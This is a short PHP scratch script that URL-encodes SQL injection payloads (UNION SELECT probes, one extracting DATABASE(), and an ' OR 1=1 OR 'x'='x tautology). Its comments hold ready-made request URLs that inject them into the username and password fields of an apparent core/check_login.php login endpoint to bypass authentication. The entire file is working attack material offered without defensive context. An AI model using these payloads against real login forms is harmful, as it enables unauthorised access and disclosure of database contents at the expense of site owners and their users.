<?php
echo urlencode('1 union select DATABASE(), 1, 2,4#'), PHP_EOL;
echo urlencode("1 union select 2,3,4,5,6#"), PHP_EOL;
echo urlencode("' OR 1=1 OR 'x'='x"), PHP_EOL;

// core/check_login.php?inputUsername=fener.dart&inputPassword='--
// core/check_login.php?inputUsername=--&inputPassword='--
// core/check_login.php?inputUsername=f%27+OR+1%3D1+OR+%27x%27%3D%27x&inputPassword=
